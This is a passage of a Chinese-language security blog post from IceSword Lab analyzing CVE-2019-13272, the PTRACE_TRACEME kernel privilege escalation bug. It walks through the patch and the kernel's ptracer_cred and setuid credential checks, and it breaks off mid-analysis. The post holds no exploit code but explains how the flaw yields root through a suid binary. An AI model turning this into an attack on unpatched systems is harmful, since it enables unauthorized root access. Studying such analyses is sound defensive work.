<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-114832940-2', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  
  <title>PTRACE_TRACEME 本地提权漏洞解析 | IceSword Lab</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="author: Gengjia Chen (chengjia4574@gmail.com) of IceSword Lab, qihoo 360 PTRACE_TRACEME 漏洞 是 Jann Horn 201907 月发现的内核提权漏洞, 漏洞发现和利用的思路有很多值得学习的地方, 本文记录了个人的学习过程 漏洞补丁我们从漏洞补丁 ptrace: Fix -&gt;ptracer_cred h">
<meta property="og:type" content="article">
<meta property="og:title" content="PTRACE_TRACEME 本地提权漏洞解析">
<meta property="og:url" content="http://yoursite.com/2019/11/28/CVE-2019-13272/index.html">
<meta property="og:site_name" content="IceSword Lab">
<meta property="og:description" content="author: Gengjia Chen (chengjia4574@gmail.com) of IceSword Lab, qihoo 360 PTRACE_TRACEME 漏洞 是 Jann Horn 201907 月发现的内核提权漏洞, 漏洞发现和利用的思路有很多值得学习的地方, 本文记录了个人的学习过程 漏洞补丁我们从漏洞补丁 ptrace: Fix -&gt;ptracer_cred h">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2019-11-25T00:00:00.000Z">
<meta property="article:modified_time" content="2025-07-16T10:02:19.305Z">
<meta property="article:author" content="IceSword Lab">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="../../../../atom.xml" title="IceSword Lab" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.ico">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="../../../../css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="../../../../index.html" id="logo">IceSword Lab</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="../../../../index.html" id="subtitle">Work hard in silence , let success make the noise.</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="../../../../index.html">Home</a>
        
          <a class="main-nav-link" href="../../../../archives">Archives</a>
        
          <a class="main-nav-link" href="../../../../research">Research</a>
        
          <a class="main-nav-link" href="../../../../vulnerabilities">Vulnerabilities</a>
        
          <a class="main-nav-link" href="../../../../recruitment">Recruitment</a>
        
          <a class="main-nav-link" href="../../../../about">About</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="../../../../atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-2019/11/28/CVE-2019-13272" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="" class="article-date">
  <time datetime="2019-11-25T00:00:00.000Z" itemprop="datePublished">2019-11-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      PTRACE_TRACEME 本地提权漏洞解析
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author: Gengjia Chen (<a href="mailto:chengjia4574@gmail.com">chengjia4574@gmail.com</a>) of IceSword Lab, qihoo 360</p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903" target="_blank" rel="noopener">PTRACE_TRACEME 漏洞</a> 是 Jann Horn 201907 月发现的内核提权漏洞, 漏洞发现和利用的思路有很多值得学习的地方, 本文记录了个人的学习过程</p>
<h2 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a>漏洞补丁</h2><p>我们从漏洞补丁 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee" target="_blank" rel="noopener">ptrace: Fix -&gt;ptracer_cred handling for PTRACE_TRACEME</a> 入手分析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Fix two issues:</span><br><span class="line"></span><br><span class="line">// 第一个问题，是 cred 的 rcu reference 问题</span><br><span class="line">When called <span class="keyword">for</span> PTRACE_TRACEME, ptrace_link() would obtain an RCU   </span><br><span class="line">reference to the parent<span class="string">'s objective credentials, then give that pointer</span></span><br><span class="line"><span class="string">to get_cred().  However, the object lifetime rules for things like</span></span><br><span class="line"><span class="string">struct cred do not permit unconditionally turning an RCU reference into</span></span><br><span class="line"><span class="string">a stable reference.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 第二个问题，tracee 记录的 tracer 的 cred 的问题</span></span><br><span class="line"><span class="string">PTRACE_TRACEME records the parent'</span>s credentials as <span class="keyword">if</span> the parent was </span><br><span class="line">acting as the subject, but that<span class="string">'s not the case.  If a malicious</span></span><br><span class="line"><span class="string">unprivileged child uses PTRACE_TRACEME and the parent is privileged, and</span></span><br><span class="line"><span class="string">at a later point, the parent process becomes attacker-controlled</span></span><br><span class="line"><span class="string">(because it drops privileges and calls execve()), the attacker ends up</span></span><br><span class="line"><span class="string">with control over two processes with a privileged ptrace relationship,</span></span><br><span class="line"><span class="string">which can be abused to ptrace a suid binary and obtain root privileges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Fix both of these by always recording the credentials of the process</span></span><br><span class="line"><span class="string">that is requesting the creation of the ptrace relationship:</span></span><br><span class="line"><span class="string">current_cred() can'</span>t change under us, and current is the proper subject</span><br><span class="line"><span class="keyword">for</span> access control.</span><br></pre></td></tr></table></figure>

<p>以上是补丁的描述，以下是补丁的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/kernel/ptrace.c b/kernel/ptrace.c</span><br><span class="line">index <span class="number">8456b</span>6e.<span class="number">.705887</span>f <span class="number">100644</span></span><br><span class="line">--- a/kernel/ptrace.c</span><br><span class="line">+++ b/kernel/ptrace.c</span><br><span class="line">@@ <span class="number">-79</span>,<span class="number">9</span> +<span class="number">79</span>,<span class="number">7</span> @@ <span class="keyword">void</span> __ptrace_link(struct task_struct *child, struct task_struct *new_parent,</span><br><span class="line">  */</span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">void</span> ptrace_link(struct task_struct *child, struct task_struct *new_parent)</span><br><span class="line"> &#123;</span><br><span class="line">-	rcu_read_lock();</span><br><span class="line">-	__ptrace_link(child, new_parent, __task_cred(new_parent));</span><br><span class="line">-	rcu_read_unlock();</span><br><span class="line">+	__ptrace_link(child, new_parent, current_cred());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>从补丁的描述来看，一共修复了 2 个问题</p>
<ul>
<li>1 是 rcu reference 的问题，对应的代码是删除了 rcu 锁; </li>
<li>2 是 tracee 记录 tracer 进程的 cred 引发的问题</li>
</ul>
<p>本文不关心第一个问题，只分析可以用于本地提权的第二个问题</p>
<p>从补丁描述看第二个问题比较复杂，我们后面再分析，补丁对应的代码倒是非常简单，<br>将 ‘__task_cred(new_parent)’ 换成了 ‘current_cred()’, 也就是说记录的 cred 从 tracer 进程的 cred 换成了当前进程的 cred</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="http://man7.org/linux/man-pages/man2/ptrace.2.html" target="_blank" rel="noopener">ptrace</a> 是一个系统调用，它提供了一种方法来让进程 (tracer) 可以观察和控制其它进程 (tracee) 的执行，检查和改变其核心映像以及寄存器, 主要用来实现断点调试和系统调用跟踪</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>    <span class="number">396</span>  kernel/ptrace.c &lt;&lt;ptrace_attach&gt;&gt;</span><br><span class="line">          ptrace_link(task, current);  <span class="comment">// link 的双方分别是要 trace 的目标进程 'task' </span></span><br><span class="line">		  <span class="comment">//  和发动 trace 的当前进程 'current'</span></span><br><span class="line"><span class="number">2</span>    <span class="number">469</span>  kernel/ptrace.c &lt;&lt;ptrace_traceme&gt;&gt;</span><br><span class="line">          ptrace_link(current, current-&gt;real_parent);  <span class="comment">// link 的双方分别是发动 trace 的</span></span><br><span class="line">				  <span class="comment">// 当前进程 ‘current’ 和当前进程的</span></span><br><span class="line">				  <span class="comment">// 父进程 ' current-&gt;real_parent'</span></span><br></pre></td></tr></table></figure>

<p>trace 关系的建立有 2 种方式</p>
<ul>
<li>1 是进程调用 fork 函数然后子进程主动调用 PTRACE_TRACEME, 这是由 tracee 发起的, 对应内核函数 ptrace_traceme</li>
<li>2 是进程调用 PTRACE_ATTACH 或者 PTRACE_SEIZE 去主动 trace 其他进程, 这是由 tracer 发起的, 对应内核函数 ptrace_attach</li>
</ul>
<p>不管是哪种方式，最后都会调用 ptrace_link 函数去建立 tracer 和 tracee 之间的 trace 关系</p>
<ul>
<li>ptrace_attach 关联的双方是 ‘task’ (tracee) 和 ‘current’ (tracer) </li>
<li>ptrace_traceme 关联的双方是 ‘current’ (tracee) 和 ‘current-&gt;real_parent’ (tracer)</li>
</ul>
<p>这里我们要仔细记住上面 2 种模式下 tracer 和 tracee 分别是什么，因为这就是漏洞的关键</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ptrace_link</span><span class="params">(struct task_struct *child, struct task_struct *new_parent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        rcu_read_lock();</span><br><span class="line">        __ptrace_link(child, new_parent, __task_cred(new_parent));</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __ptrace_link(struct task_struct *child, struct task_struct *new_parent,</span><br><span class="line">                   <span class="keyword">const</span> struct cred *ptracer_cred)</span><br><span class="line">&#123;</span><br><span class="line">        BUG_ON(!list_empty(&amp;child-&gt;ptrace_entry));</span><br><span class="line">        list_add(&amp;child-&gt;ptrace_entry, &amp;new_parent-&gt;ptraced); <span class="comment">// 1. 将自己加入父进程的 ptraced 队列</span></span><br><span class="line">        child-&gt;parent = new_parent; <span class="comment">// 2. 将父进程地址保存在 parent 指针</span></span><br><span class="line">        child-&gt;ptracer_cred = get_cred(ptracer_cred); <span class="comment">// 3. 保存 ptracer_cred, 我们只关注这个变量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>建立 trace 关系的关键是由 tracee 记录 tracer 的 cred, 保存在 tracee 的 ‘ptracer_cred’ 变量，这个变量名很顾名思义</p>
<p>ptracer_cred 这个概念是由 2016 年的一个补丁 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=64b875f7ac8a5d60a4e191479299e931ee949b67" target="_blank" rel="noopener">ptrace: Capture the ptracer’s creds not PT_PTRACE_CAP</a> 引入的, 引入 ptracer_cred 的目的是用于当 tracee 执行 exec 去加载 <a href="https://www.computerhope.com/jargon/s/setuid.htm" target="_blank" rel="noopener">setuid executable</a> 时做安全检测</p>
<p>为什么需要这个安全检测呢?</p>
<p><a href="http://man7.org/linux/man-pages/man3/exec.3.html" target="_blank" rel="noopener">exec</a> 函数族可以更新进程的镜像, 如果被执行文件的 <a href="https://en.wikipedia.org/wiki/Setuid" target="_blank" rel="noopener">setuid 位</a> 置位，则运行这个可执行文件时，进程的 <a href="https://en.wikipedia.org/wiki/User_identifier" target="_blank" rel="noopener">euid</a> 会被修改成该可执行文件的所有者的 uid, 如果可执行文件的所有者权限比调用 exec 的进程高, 运行这类 <a href="https://www.computerhope.com/jargon/s/setuid.htm" target="_blank" rel="noopener">setuid executable</a> 会有提权的效果</p>
<p>假如执行 exec 的进程本身是一个 tracee, 当它执行了 <a href="https://www.computerhope.com/jargon/s/setuid.htm" target="_blank" rel="noopener">setuid executable</a> 提权之后，由于 tracer 可以随时修改 tracee 的寄存器和内存，这时候低权限的 tracer 就可以控制 tracee 去执行越权操作</p>
<p>作为内核，显然是不允许这样的越权行为存在的，所以当 trace 关系建立时, tracee 需要保存 tracer 的 cred (即 ptracer_cred), 然后在执行 exec 过程中, 如果发现执行的可执行程序是 <a href="https://en.wikipedia.org/wiki/Setuid" target="_blank" rel="noopener">setuid 位</a> 置位的， 则会判断 ‘ptracer_cred’ 的权限， 如果权限不满足，将不会执行  <a href="https://en.wikipedia.org/wiki/Setuid" target="_blank" rel="noopener">setuid 位</a> 的提权， 而是以原有的进程权限执行这个  <a href="https://www.computerhope.com/jargon/s/setuid.htm" target="_blank" rel="noopener">setuid executable</a> </p>
<p>这个过程的代码分析如下(本文的代码分析基于 v4.19-rc8)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">do_execve</span><br><span class="line">  -&gt; __do_execve_file</span><br><span class="line">  -&gt; prepare_binprm </span><br><span class="line">      -&gt; bprm_fill_uid</span><br><span class="line">      -&gt; security_bprm_set_creds</span><br><span class="line">          -&gt;cap_bprm_set_creds</span><br><span class="line">  	    -&gt; ptracer_capable</span><br><span class="line">          -&gt;selinux_bprm_set_creds</span><br><span class="line">          -&gt;(apparmor_bprm_set_creds)</span><br><span class="line">          -&gt;(smack_bprm_set_creds)</span><br><span class="line">          -&gt;(tomoyo_bprm_set_creds)</span><br></pre></td></tr></table></figure>

<p>如上，execve 权限相关的操作主要在函数 ‘prepare_binprm’ 里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1567</span> <span class="function"><span class="keyword">int</span> <span class="title">prepare_binprm</span><span class="params">(struct linux_binprm *bprm)</span></span></span><br><span class="line"><span class="function">1568 </span>&#123;</span><br><span class="line"><span class="number">1569</span>         <span class="keyword">int</span> retval;</span><br><span class="line"><span class="number">1570</span>         <span class="keyword">loff_t</span> pos = <span class="number">0</span>;</span><br><span class="line"><span class="number">1571</span> </span><br><span class="line"><span class="number">1572</span>         bprm_fill_uid(bprm); <span class="comment">// &lt;-- 初步填充新进程的 cred</span></span><br><span class="line"><span class="number">1573</span> </span><br><span class="line"><span class="number">1574</span>         <span class="comment">/* fill in binprm security blob */</span></span><br><span class="line"><span class="number">1575</span>         retval = security_bprm_set_creds(bprm); <span class="comment">// &lt;-- 安全检测， 	</span></span><br><span class="line">			 <span class="comment">// 可能会修改新进程的 cred</span></span><br><span class="line"><span class="number">1576</span>         <span class="keyword">if</span> (retval)</span><br><span class="line"><span class="number">1577</span>                 <span class="keyword">return</span> retval;</span><br><span class="line"><span class="number">1578</span>         bprm-&gt;called_set_creds = <span class="number">1</span>;</span><br><span class="line"><span class="number">1579</span> </span><br><span class="line"><span class="number">1580</span>         <span class="built_in">memset</span>(bprm-&gt;buf, <span class="number">0</span>, BINPRM_BUF_SIZE);</span><br><span class="line"><span class="number">1581</span>         <span class="keyword">return</span> kernel_read(bprm-&gt;file, bprm-&gt;buf, BINPRM_BUF_SIZE, &amp;pos);</span><br><span class="line"><span class="number">1582</span> &#125;</span><br></pre></td></tr></table></figure>

<p>如上，先调用 ‘bprm_fill_uid’ 初步填充新进程的 cred, 再调用 ‘security_bprm_set_creds’ 做安全检测并修改新的 cred</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1509</span> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bprm_fill_uid</span><span class="params">(struct linux_binprm *bprm)</span></span></span><br><span class="line"><span class="function">1510 </span>&#123;</span><br><span class="line"><span class="number">1511</span>         <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line"><span class="number">1512</span>         <span class="keyword">unsigned</span> <span class="keyword">int</span> mode;</span><br><span class="line"><span class="number">1513</span>         <span class="keyword">kuid_t</span> uid;</span><br><span class="line"><span class="number">1514</span>         <span class="keyword">kgid_t</span> gid;</span><br><span class="line"><span class="number">1515</span> </span><br><span class="line"><span class="number">1516</span>         <span class="comment">/*</span></span><br><span class="line"><span class="comment">1517          * Since this can be called multiple times (via prepare_binprm),</span></span><br><span class="line"><span class="comment">1518          * we must clear any previous work done when setting set[ug]id</span></span><br><span class="line"><span class="comment">1519          * bits from any earlier bprm-&gt;file uses (for example when run</span></span><br><span class="line"><span class="comment">1520          * first for a setuid script then again for its interpreter).</span></span><br><span class="line"><span class="comment">1521          */</span></span><br><span class="line"><span class="number">1522</span>         bprm-&gt;cred-&gt;euid = current_euid(); <span class="comment">// &lt;--- 先使用本进程的euid</span></span><br><span class="line"><span class="number">1523</span>         bprm-&gt;cred-&gt;egid = current_egid();</span><br><span class="line"><span class="number">1524</span> </span><br><span class="line"><span class="number">1525</span>         <span class="keyword">if</span> (!mnt_may_suid(bprm-&gt;file-&gt;f_path.mnt))</span><br><span class="line"><span class="number">1526</span>                 <span class="keyword">return</span>;</span><br><span class="line"><span class="number">1527</span> </span><br><span class="line"><span class="number">1528</span>         <span class="keyword">if</span> (task_no_new_privs(current))</span><br><span class="line"><span class="number">1529</span>                 <span class="keyword">return</span>;</span><br><span class="line"><span class="number">1530</span> </span><br><span class="line"><span class="number">1531</span>         inode = bprm-&gt;file-&gt;f_path.dentry-&gt;d_inode;</span><br><span class="line"><span class="number">1532</span>         mode = READ_ONCE(inode-&gt;i_mode);</span><br><span class="line"><span class="number">1533</span>         <span class="keyword">if</span> (!(mode &amp; (S_ISUID|S_ISGID))) <span class="comment">// &lt;---------- 如果可执行文件没有 setuid/setgid 位，这里就可以返回了</span></span><br><span class="line"><span class="number">1534</span>                 <span class="keyword">return</span>;</span><br><span class="line"><span class="number">1535</span> </span><br><span class="line"><span class="number">1536</span>         <span class="comment">/* Be careful if suid/sgid is set */</span></span><br><span class="line"><span class="number">1537</span>         inode_lock(inode);</span><br><span class="line"><span class="number">1538</span> </span><br><span class="line"><span class="number">1539</span>         <span class="comment">/* reload atomically mode/uid/gid now that lock held */</span></span><br><span class="line"><span class="number">1540</span>         mode = inode-&gt;i_mode;</span><br><span class="line"><span class="number">1541</span>         uid = inode-&gt;i_uid; <span class="comment">// &lt;---- 如果文件 S_ISUID 置位，使用文件的 i_uid</span></span><br><span class="line"><span class="number">1542</span>         gid = inode-&gt;i_gid;</span><br><span class="line"><span class="number">1543</span>         inode_unlock(inode);</span><br><span class="line"><span class="number">1544</span> </span><br><span class="line"><span class="number">1545</span>         <span class="comment">/* We ignore suid/sgid if there are no mappings for them in the ns */</span></span><br><span class="line"><span class="number">1546</span>         <span class="keyword">if</span> (!kuid_has_mapping(bprm-&gt;cred-&gt;user_ns, uid) ||</span><br><span class="line"><span class="number">1547</span>                  !kgid_has_mapping(bprm-&gt;cred-&gt;user_ns, gid))</span><br><span class="line"><span class="number">1548</span>                 <span class="keyword">return</span>;</span><br><span class="line"><span class="number">1549</span> </span><br><span class="line"><span class="number">1550</span>         <span class="keyword">if</span> (mode &amp; S_ISUID) &#123;</span><br><span class="line"><span class="number">1551</span>                 bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;</span><br><span class="line"><span class="number">1552</span>                 bprm-&gt;cred-&gt;euid = uid; <span class="comment">// &lt;------ 使用文件的 i_uid 作为新进程的 euid</span></span><br><span class="line"><span class="number">1553</span>         &#125;</span><br><span class="line"><span class="number">1554</span> </span><br><span class="line"><span class="number">1555</span>         <span class="keyword">if</span> ((mode &amp; (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) &#123;</span><br><span class="line"><span class="number">1556</span>                 bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;</span><br><span class="line"><span class="number">1557</span>                 bprm-&gt;cred-&gt;egid = gid;</span><br><span class="line"><span class="number">1558</span>         &#125;</span><br><span class="line"><span class="number">1559</span> &#125;</span><br></pre></td></tr></table></figure>

<p>如上， 主要看两行</p>
<ul>
<li>1522 行, 将当前的 euid 赋值新的 euid, 所以大部分执行了 execve 的进程的权限跟原来的一样</li>
<li>1552 行，如果带有 suid bit, 则将可执行文件的所有者的 uid 赋值新的 euid, 这就是所谓 setuid 的实现， 新的 euid 变成了它执行的可执行文件所有者的 uid， 如果所有者是特权用户， 这里就实现了提权</li>
</ul>
<p>但是，这里的 euid 依然不是最终的结果， 还需要进入函数 security_bprm_set_creds 做进一步的安全检测</p>
<p>security_bprm_set_creds 函数调用的是 <a href="https://en.wikipedia.org/wiki/Linux_Security_Modules" target="_blank" rel="noopener">LSM</a> 框架</p>
<p>在我分析的内核版本上, 实现 ‘bprm_set_creds’ 这个 hook 点安全检测的 lsm 框架有 5 种, 检测函数如下, </p>
<ul>
<li>cap_bprm_set_creds</li>
<li>selinux_bprm_set_creds</li>
<li>apparmor_bprm_set_creds</li>
<li>smack_bprm_set_creds</li>
<li>tomoyo_bprm_set_creds</li>
</ul>
<p>这里哪些 hook 检测函数会被执行，其实是跟具体的内核配置有关的, 理论上把所有 lsm 框架都启用的话，上述所有这些实现了 ‘bprm_set_creds’ hook 检测的函数都会被执行 </p>
<p>在我的分析环境里实际运行的检测函数只有 cap_bprm_set_creds 和 selinux_bprm_set_creds 这俩</p>
<p>其中， 对 euid 有影响的是 ‘cap_bprm_set_creds’ 这个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">815</span> <span class="function"><span class="keyword">int</span> <span class="title">cap_bprm_set_creds</span><span class="params">(struct linux_binprm *bprm)</span></span></span><br><span class="line"><span class="function">    816 </span>&#123;</span><br><span class="line">    <span class="number">817</span>         <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> = <span class="title">current_cred</span>();</span></span><br><span class="line">    <span class="number">818</span>         <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span> = <span class="title">bprm</span>-&gt;<span class="title">cred</span>;</span></span><br><span class="line">    <span class="number">819</span>         <span class="keyword">bool</span> effective = <span class="literal">false</span>, has_fcap = <span class="literal">false</span>, is_setid;</span><br><span class="line">    <span class="number">820</span>         <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="number">821</span>         <span class="keyword">kuid_t</span> root_uid;</span><br><span class="line">    ===================== skip ======================</span><br><span class="line">    <span class="number">838</span>         <span class="comment">/* Don't let someone trace a set[ug]id/setpcap binary with the revised</span></span><br><span class="line"><span class="comment">    839          * credentials unless they have the appropriate permit.</span></span><br><span class="line"><span class="comment">    840          *</span></span><br><span class="line"><span class="comment">    841          * In addition, if NO_NEW_PRIVS, then ensure we get no new privs.</span></span><br><span class="line"><span class="comment">    842          */</span></span><br><span class="line">    <span class="number">843</span>         is_setid = __is_setuid(<span class="keyword">new</span>, old) || __is_setgid(<span class="keyword">new</span>, old);  </span><br><span class="line">    <span class="number">844</span> </span><br><span class="line">    <span class="number">845</span>         <span class="keyword">if</span> ((is_setid || __cap_gained(permitted, <span class="keyword">new</span>, old)) &amp;&amp; <span class="comment">// &lt;---- 检测是否执行的是 setid 程序</span></span><br><span class="line">    <span class="number">846</span>             ((bprm-&gt;unsafe &amp; ~LSM_UNSAFE_PTRACE) || </span><br><span class="line">    <span class="number">847</span>              !ptracer_capable(current, <span class="keyword">new</span>-&gt;user_ns))) &#123; <span class="comment">// &lt;----- 如果执行execve的进程被trace了，且执行的程序是 setuid 的，需要增加权限检测</span></span><br><span class="line">    <span class="number">848</span>                 <span class="comment">/* downgrade; they get no more than they had, and maybe less */</span></span><br><span class="line">    <span class="number">849</span>                 <span class="keyword">if</span> (!ns_capable(<span class="keyword">new</span>-&gt;user_ns, CAP_SETUID) ||</span><br><span class="line">    <span class="number">850</span>                     (bprm-&gt;unsafe &amp; LSM_UNSAFE_NO_NEW_PRIVS)) &#123;</span><br><span class="line">    <span class="number">851</span>                         <span class="keyword">new</span>-&gt;euid = <span class="keyword">new</span>-&gt;uid; <span class="comment">// &lt;----- 如果检测不通过，会将新进程的 euid 重新设置为原进程的 uid</span></span><br><span class="line">    <span class="number">852</span>                         <span class="keyword">new</span>-&gt;egid = <span class="keyword">new</span>-&gt;gid;</span><br><span class="line">    <span class="number">853</span>                 &#125;</span><br><span class="line">    <span class="number">854</span>                 <span class="keyword">new</span>-&gt;cap_permitted = cap_intersect(<span class="keyword">new</span>-&gt;cap_permitted,</span><br><span class="line">    <span class="number">855</span>                                                    old-&gt;cap_permitted);</span><br><span class="line">    <span class="number">856</span>         &#125;</span><br><span class="line">    <span class="number">857</span> </span><br><span class="line">    <span class="number">858</span>         <span class="keyword">new</span>-&gt;suid = <span class="keyword">new</span>-&gt;fsuid = <span class="keyword">new</span>-&gt;euid;</span><br><span class="line">    <span class="number">859</span>         <span class="keyword">new</span>-&gt;sgid = <span class="keyword">new</span>-&gt;fsgid = <span class="keyword">new</span>-&gt;egid;</span><br><span class="line">    ===================== skip ======================</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上</p>
<ul>
